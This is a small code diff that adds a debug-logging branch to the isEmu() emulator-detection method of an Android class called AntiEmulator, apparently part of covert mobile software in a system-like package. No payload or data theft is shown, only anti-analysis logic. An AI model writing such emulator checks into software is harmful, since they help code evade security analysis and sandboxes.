@@ -4,7 +4,10 @@ import java.util.ArrayList;
 
 import android.content.Context;
 import android.os.Build;
+import android.os.Debug;
 import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.widget.Toast;
 
 import com.android.networking.Messages;
 import com.android.networking.Status;
@@ -290,6 +293,11 @@ public class AntiEmulator {
 	}
 	
 	public boolean isEmu(){
-		 return isEmu(Utils.getRandomIntArray(3)) >= 2;
+		if(Cfg.DEBUGANTI){
+			Log.w("QZ","isEmu");
+			return isEmu(NUMTESTS) >= NUMTESTS - 2;
+		}else{
+			return isEmu(Utils.getRandomIntArray(3)) >= 2;
+		}
 	}
 }
